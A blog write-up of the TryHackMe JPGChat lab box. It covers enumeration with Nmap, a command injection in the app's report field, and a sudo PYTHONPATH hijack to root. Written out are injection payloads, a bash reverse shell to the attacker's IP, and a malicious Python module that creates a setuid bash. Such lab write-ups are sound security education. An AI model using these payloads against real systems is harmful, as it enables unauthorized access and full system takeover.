---
layout: blog.html
title: "TryHackMe - JPGChat Writeup"
date: 2021-08-17
---

[JPGChat](https://tryhackme.com/room/jpgchat) was a very quick and easy box, but it does have a simple OSINT step that was a bit of fun to follow.
<!-- more -->

## Nmap Enumeration
The first step in any pentest situation is enumeration. It's important to get as much information about the machine and its users as possible. To start off, we'll use Nmap to perform a port scan and see what services are active and listening on the box. Nmap is a versatile tool, and many people have their own preferred methods to balance speed and accuracy, but here are the options I'll use.

- `-sC`: Run default scripts. Nmap can do additional enumeration beyond just checking for open ports, and this option will run some quick and useful extra scans to give us even more information about what we're working with.
- `-sV`: Run version detection. Knowing what specific version of a service is in use can help with finding potential vulnerabilities, or ruling them out.
- `-v`: Be verbose. This outputs extra information to the console as the scan runs, the most useful of which are status updates and showing open ports as it finds them.
- `-oN`: Output to a file in the Nmap format. Having a file to refer back to instead of having to scroll through console output is very useful. Nmap can save to a variety of file formats, and you may have reasons to use them, but for me just the normal plain-text format is enough.
- `-p`: Scan specific ports. `-p<n>` will scan a specific port, and `-p-` scans every port from 1 to 65,535. While doing a full port scan is good, it can take a while, so it's good to let that one run while you're doing other tasks.

We'll run two Nmap scans. The first one will scan the top 1000 ports that are listening to give us a strong starting point, and the second scan will run in the background and check every possible port. Since this second scan will take longer, we can let it run in the background while we work on other things.

```bash
nmap -sC -sV -v -oN nmap-initial.nmap 10.10.54.184
nmap -p- -v -oN nmap-allports.nmap 10.10.54.184
```

Nmap finds two open ports: port 22 running SSH, and port 3000. While Nmap can't identify what service is running, it does try to give us some information that we can use to identify the service ourselves.

```
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     Welcome to JPChat
|     source code of this service can be found at our admin's github
|     MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
|_    REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
```

We get that same message if we try to connect using Netcat.

``` 
$ nc 10.10.54.184 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
```

There are two important facts that will help us proceed:

1. The name of the service is JPChat
2. The source code for the application is on GitHub somewhere.

## Command Injection

A quick Google search finds us a [GitHub repository](https://github.com/Mozzie-jpg/JPChat), and checking the source code seems to line up with the welcome message we got when connecting, so it's probably safe to assume this is the same application.

Inspecting the source code of the application, there's something interesting in the "report" function.

```python
def report_form():

	print ('this report will be read by Mozzie-jpg')
	your_name = input('your name:\n')
	report_text = input('your report:\n')
	os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
	os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)
```

The input fields for our name and report are both passed to `os.system` without any kind of filtering. This means we can probably break out of the command that was intended to be run and run our own arbitrary commands.

We'll use a single-quote to break out of the initial `bash -c` command, add a semicolon to specify that we want to start a new command, and end things off with a pound sign to comment out the rest of the line. We can do a simple proof-of-concept before we actually start running anything malicious.

```
[REPORT]
this report will be read by Mozzie-jpg
your name:
'; whoami #
your report:
'; #

wes
```

Our `whoami` command gives us a username back, meaning we do indeed have successful command injection. Now we can build out a reverse shell to get proper access to the box. If you've never built a reverse shell before, there are [plenty of online resources](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) to help you out. Below is one of the more basic and common bash reverse shells.

```
'; bash -c 'bash -i >& /dev/tcp/10.13.14.52/9001 0>&1'; #
```

We land as the `wes` user, who has access to the user flag. We know SSH is listening on the box, so while we're here we can also drop an SSH key in to give us better persistence. An SSH session will just be a much better experience than a reverse shell, plus it opens up potentially useful features like file transfers and port forwarding.

## Privilege Escalation
We'll start with some basic manual enumeration before we get into anything automated. There aren't any interesting files in `wes`'s home directory, but `sudo -l` gives us a useful find.

```
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```

There are two things we should take away from this information:

1. `wes` can run the `test_module.py` script as root without entering a password.
2. The `PYTHONPATH` environment variable will be retained when running commands with `sudo`

The `test_module.py` script is only writeable by root, meaning we can't just edit it, so we'll need to find another way to exploit that script.

If you aren't already familiar with Python's environment variables, a quick Google search will show you that the `PYTHONPATH` variable declares the location that Python should look for modules and packages. We can read the contents of the `test_module.py` and see that it imports the `compare` module. If we could make our own malicious `compare` module and force the script to load it with the `PYTHONPATH` variable, that should be enough to root the box.

```python
import os

class compare:
  def Str(s1,s2,s3):
    os.system('cp /bin/bash /bin/sbash')
    os.system('chmod +s /bin/sbash')
```

This script creates a copy of `bash` and then sets the [setuid bit](https://man7.org/linux/man-pages/man2/setuid.2.html) on that copy, which will give us a root shell if we run the copy with the `-p` flag. We'll create a folder to store our script in, save it as `compare.py`, and add that folder to the `PYTHONPATH` variable.

```bash
export PYTHONPATH=/home/wes/mod
sudo python3 /opt/development/test_module.py
/bin/sbash -p
```

We now have root access and can grab the root flag.